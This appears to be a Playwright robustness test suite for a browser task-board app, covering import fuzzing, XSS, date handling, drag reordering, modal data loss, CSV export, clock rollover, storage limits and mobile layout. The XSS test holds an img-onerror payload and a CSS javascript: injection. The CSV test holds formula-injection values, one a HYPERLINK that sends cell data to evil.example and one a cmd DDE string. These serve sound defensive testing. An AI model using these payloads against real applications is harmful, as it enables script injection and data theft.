// Robustness suite: each test prints one JSON line {test, ...findings}.
const L = require('./lib');
const log = (o) => console.log(JSON.stringify(o));

const mini = (tasks, extra = {}) => Object.assign({
  version: 1, meta: { nextNum: 1 },
  stages: [{ id: 'st_todo', name: 'To Do' }, { id: 'st_prog', name: 'Doing', wip: 5 }, { id: 'st_done', name: 'Done', done: true }],
  projects: [{ id: 'pr_a', name: 'Alpha', color: '#2D7FF9' }], tasks,
}, extra);
const T = (o) => Object.assign({ id: 't' + Math.random(), title: 'task', projectId: 'pr_a', stageId: 'st_todo', priority: 'medium', start: L.iso(0), due: L.iso(3) }, o);

// Restores a backup through the real file-input UI and returns the preview message + board facts.
async function restore(page, text) {
  await page.click('#btn-backup');
  await page.setInputFiles('#b-file', { name: 'b.json', mimeType: 'application/json', buffer: Buffer.from(text) });
  // The file summary (or the reason it was rejected) replaces the drop-zone prompt once the file is read.
  await page.waitForFunction(() => !/^Drop a/.test(document.getElementById('dz-sum').textContent));
  const msg = await page.textContent('#dz-sum');
  const enabled = await page.$eval('#r-row', (r) => !r.hidden);
  // Replacing a board takes two clicks: the first one spells out what will be replaced.
  if (enabled) { await page.click('#b-restore'); await page.click('#b-restore'); } else await page.click('[data-close]');
  return { msg, accepted: enabled };
}

(async () => {
  // 1. Import fuzzing.
  {
    const { page, ctx } = await L.open({});
    const cases = {
      notJson: 'hello',
      emptyObj: '{}',
      nullStage: JSON.stringify(mini([], { stages: [null] })),
      nullTask: JSON.stringify(mini([null])),
      nanNextNum: JSON.stringify(mini([T({ ref: 'T-001' })], { meta: { nextNum: 'abc' } })),
      protoProjectId: JSON.stringify(mini([T({ title: 'ghost task', projectId: 'constructor' })])),
      impossibleDate: JSON.stringify(mini([T({ title: 'feb30', due: '2026-02-30', start: '2026-02-01' })])),
      yearZero: JSON.stringify(mini([T({ title: 'y0', due: '0000-00-00', start: '' })])),
      giantTitle: JSON.stringify(mini([T({ title: 'W'.repeat(1_000_000) })])),
      dupStageIds: JSON.stringify(mini([T({ stageId: 'st_x' })], { stages: [{ id: 'st_x', name: 'A' }, { id: 'st_x', name: 'B', done: true }] })),
    };
    for (const [k, txt] of Object.entries(cases)) {
      const r = await restore(page, txt);
      const facts = await page.evaluate(() => ({
        refs: [...document.querySelectorAll('.card .ref')].map((e) => e.textContent).slice(0, 3),
        cards: document.querySelectorAll('.card').length,
        badges: [...document.querySelectorAll('.card .badge')].map((e) => e.textContent).join(' / '),
      }));
      // For NaN nextNum, add a task to see the generated ref.
      if (k === 'nanNextNum' && r.accepted) {
        await page.click('#btn-new'); await page.fill('#f-title', 'after import'); await page.click('[data-m=save]');
        facts.newRef = await page.evaluate(() => [...document.querySelectorAll('.card .ref')].map((e) => e.textContent));
      }
      if (k === 'protoProjectId' && r.accepted) {
        for (const g of ['priority', 'project']) {
          await page.selectOption('#grp', g);
          facts['cardsGrouped_' + g] = await page.$$eval('.card', (c) => c.length);
        }
        await page.selectOption('#grp', 'priority');
      }
      if (k === 'impossibleDate' && r.accepted) {
        await page.click('.card');
        facts.dueFieldAfterOpen = await page.inputValue('#f-due');
        await page.click('[data-close]');
      }
      log({ test: 'import:' + k, ...r, msg: r.msg.slice(0, 120), ...facts });
    }
    log({ test: 'import:pageErrors', errors: page._errors });
    await ctx.close();
  }

  // 2. XSS through every user-controlled string.
  {
    const p = '"><img src=x onerror="window.__x=(window.__x||0)+1">';
    const data = mini([T({ title: p, desc: p, assignee: p, ref: p })], {
      stages: [{ id: 'st_todo', name: p }, { id: 'st_done', name: 'Done', done: true }],
      projects: [{ id: 'pr_a', name: p, color: '#000000;background:url(javascript:alert(1))' }],
    });
    const { page, ctx } = await L.open({ data });
    for (const g of ['priority', 'project', 'assignee', 'none']) await page.selectOption('#grp', g);
    await page.click('#tab-timeline'); await page.click('#tab-board');
    await page.click('.card'); await page.click('[data-close]');
    await page.click('#btn-projects'); await page.click('[data-close]');
    await page.click('#btn-stages'); await page.click('[data-close]');
    await page.waitForTimeout(300);
    log({ test: 'xss', fired: await page.evaluate(() => window.__x || 0), errors: page._errors });
    await ctx.close();
  }

  // 3. Year typo / far-future deadline through the real form. Chrome date inputs accept >4-digit years.
  {
    const { page, ctx } = await L.open({ data: mini([T({ title: 'normal' })]) });
    await page.click('.card');
    const accepted = await page.evaluate(() => { const e = document.getElementById('f-due'); e.value = '20260-01-15'; return e.value; });
    await page.click('[data-m=save]');
    const formError = await page.$eval('#overlay', (o) => o.hidden ? null : document.getElementById('f-err').textContent);
    if (formError) await page.click('[data-close]');
    const onBoard = await page.$eval('.card .card-meta .badge:not(.blk)', (e) => e.textContent).catch(() => null);
    await page.waitForTimeout(600);
    await page.reload(); await page.waitForTimeout(300);
    const afterReload = await page.$eval('.card', (c) => c.textContent);
    log({ test: 'date:5digitYear', inputAccepted: accepted, formError, badgeBeforeReload: onBoard, cardAfterReload: afterReload });
    await ctx.close();
  }
  for (const due of ['2190-03-01', '2205-03-01', '2999-12-31', '9999-12-31']) {
    const { page, ctx } = await L.open({ data: mini([T({ title: 'typo', due })]), prefs: { view: 'board' } });
    const ms = await Promise.race([
      L.timeIt(page, "document.getElementById('tab-timeline').click()"),
      new Promise((r) => setTimeout(() => r('>60000 (hung)'), 60000)),
    ]);
    let extra = {};
    if (typeof ms === 'number') extra = await page.evaluate(() => ({ nodes: document.querySelectorAll('*').length, tlWidthPx: document.querySelector('.tl') ? document.querySelector('.tl').scrollWidth : 'no timeline (date rejected on load)', clipNote: (document.body.textContent.match(/\d+ tasks? falls? outside[^.]*/) || [null])[0] }));
    log({ test: 'timeline:yearTypo', due, renderMs: ms, ...extra });
    await ctx.close().catch(() => {});
  }

  // 4. Reorder precision: repeatedly drop the last card between the first two.
  {
    const tasks = ['A', 'B', 'C'].map((t, i) => T({ id: 't' + t, ref: 'T-00' + (i + 1), title: t, order: (i + 1) * 10 }));
    const { page, ctx } = await L.open({ data: mini(tasks), prefs: { groupBy: 'none' } });
    let failedAt = null;
    for (let i = 1; i <= 80 && failedAt == null; i++) {
      const res = await page.evaluate(() => {
        const cell = document.querySelector('.cell[data-stage=st_todo]');
        const cards = [...cell.querySelectorAll('.card')];
        const moving = cards[cards.length - 1], target = cards[1];
        const dt = new DataTransfer(), y = target.getBoundingClientRect().top + 2;
        moving.dispatchEvent(new DragEvent('dragstart', { bubbles: true, dataTransfer: dt }));
        target.dispatchEvent(new DragEvent('dragover', { bubbles: true, cancelable: true, dataTransfer: dt, clientY: y }));
        target.dispatchEvent(new DragEvent('drop', { bubbles: true, cancelable: true, dataTransfer: dt, clientY: y }));
        const after = [...document.querySelectorAll('.cell[data-stage=st_todo] .card h4')].map((h) => h.textContent);
        return { moved: moving.querySelector('h4').textContent, after };
      });
      if (res.after[1] !== res.moved) failedAt = { iteration: i, ...res };
    }
    log({ test: 'reorder:floatPrecision', failedAt });
    await ctx.close();
  }

  // 5. Modal data loss.
  {
    const { page, ctx } = await L.open({ data: mini([T({ title: 'x' })]) });
    await page.click('#btn-new'); await page.fill('#f-title', 'Half-written task'); await page.fill('#f-desc', 'Long protocol notes');
    await page.keyboard.press('Escape');
    const escClosed = await page.$eval('#overlay', (o) => o.hidden);
    let secondEscCloses = null;
    if (!escClosed) { await page.keyboard.press('Escape'); secondEscCloses = await page.$eval('#overlay', (o) => o.hidden); }
    // Select text in the title by dragging and releasing outside the dialog.
    await page.click('#btn-new'); await page.fill('#f-title', 'Another draft');
    const box = await page.locator('#f-title').boundingBox();
    await page.mouse.move(box.x + box.width - 5, box.y + box.height / 2); await page.mouse.down();
    await page.mouse.move(5, 5, { steps: 5 }); await page.mouse.up();
    const dragOutClosed = await page.$eval('#overlay', (o) => o.hidden);
    if (!dragOutClosed) await page.click('[data-close]');
    // Focus trap: Tab 30 times from inside the modal and see whether focus escapes.
    await page.click('#btn-new');
    let escaped = false;
    for (let i = 0; i < 30; i++) { await page.keyboard.press('Tab'); if (!(await page.evaluate(() => document.getElementById('overlay').contains(document.activeElement)))) { escaped = true; break; } }
    log({ test: 'modal', escapeDiscardsWithoutConfirm: escClosed, secondEscCloses, dragSelectOutsideClosesAndDiscards: dragOutClosed, focusEscapesModal: escaped });
    await ctx.close();
  }

  // 6. Emoji / non-latin initials, assignee duplicates.
  {
    const { page, ctx } = await L.open({ data: mini([T({ assignee: '😀 Smith' }), T({ assignee: 'Patel' }), T({ assignee: 'patel' }), T({ assignee: 'Patel ' })]) });
    const who = await page.$$eval('.who', (w) => w.map((e) => [...e.textContent].map((c) => c.codePointAt(0).toString(16))));
    const people = await page.$$eval('#flt-assignee option', (o) => o.map((e) => JSON.stringify(e.value)));
    log({ test: 'assignee', initialsCodepoints: who[0], assigneeFilterOptions: people });
    await ctx.close();
  }

  // 7. CSV formula injection, with a mock downloads capability.
  {
    const claude = `window.claude={use:async function(n){if(n==='downloads')return {save:async function(o){window.__dl=o}};throw new Error('no '+n)}}`;
    const { page, ctx } = await L.open({ claude, data: mini([T({ title: '=HYPERLINK("http://evil.example/?"&A1,"Click")', assignee: '+cmd|/C calc!A0' })]) });
    await page.click('#btn-backup'); await page.click('[data-m=dl-csv]'); await page.waitForTimeout(200);
    const csv = await page.evaluate(() => window.__dl && window.__dl.data);
    log({ test: 'csv:formulaInjection', row: csv && csv.split('\r\n')[1] });
    await ctx.close();
  }

  // 8. Stale "today": leave the tab open across midnight.
  {
    const now = new Date(); const lateTonight = new Date(now.getFullYear(), now.getMonth(), now.getDate(), 23, 59, 0);
    const today = `${lateTonight.getFullYear()}-${String(lateTonight.getMonth() + 1).padStart(2, '0')}-${String(lateTonight.getDate()).padStart(2, '0')}`;
    const { page, ctx } = await L.open({ clock: lateTonight, data: mini([T({ title: 'due today', start: today, due: today })]) });
    const before = await page.textContent('.card .card-meta .badge:not(.blk)');
    await page.clock.fastForward('02:00:00');
    await page.click('#flt-overdue'); await page.click('#flt-overdue'); // force a re-render
    const after = await page.textContent('.card .card-meta .badge:not(.blk)');
    const stats = await page.textContent('#stats');
    log({ test: 'clock:midnight', badgeBefore: before, badgeTwoHoursLater: after, stats });
    await ctx.close();
  }

  // 9. Example-data removal also removes edits and user work in example projects.
  {
    const { page, ctx } = await L.open({});
    await page.click('[data-act=load-sample]');
    await page.click('.card'); await page.fill('#f-title', 'MY REAL EDITED TASK'); await page.click('[data-m=save]'); const saveErr = await page.$eval('#overlay', (o) => o.hidden ? null : document.getElementById('f-err').textContent); if (saveErr) { log({ test: 'sample:firstCardSaveError', saveErr }); await page.fill('#f-due', await page.inputValue('#f-start')); await page.click('[data-m=save]'); }
    await page.click('[data-act=clear-sample]'); await page.click('[data-m=cs-ok]');
    const survived = await page.evaluate(() => document.body.textContent.includes('MY REAL EDITED TASK'));
    log({ test: 'sample:clearRemovesEdits', editedTaskSurvived: survived });
    await ctx.close();
  }

  // 10. localStorage quota: large notes push past the per-origin limit.
  {
    const data = L.genBoard(800, { notesLen: 8000 });
    const { page, ctx } = await L.open({ data: L.genBoard(10) });
    await restore(page, JSON.stringify(data));
    await page.waitForTimeout(800);
    const st = await L.status(page);
    await page.reload(); await page.waitForTimeout(400);
    const afterReload = await page.$$eval('.stage-head .count', (c) => c.reduce((s, e) => s + +e.textContent, 0));
    log({ test: 'storage:quota', jsonMB: +(JSON.stringify(data).length / 1048576).toFixed(1), statusAfterRestore: st, cardsAfterReload: afterReload, expected: 800 });
    await ctx.close();
  }

  // 11. Phone width: horizontal overflow and touch-drag support.
  {
    const { page, ctx } = await L.open({ data: L.genBoard(30), viewport: { width: 375, height: 800 } });
    const r = await page.evaluate(() => ({
      pageOverflowsX: document.documentElement.scrollWidth > window.innerWidth,
      doctype: !!document.doctype, compatMode: document.compatMode,
    }));
    log({ test: 'mobile', ...r });
    await ctx.close();
  }

  await L.close();
})();
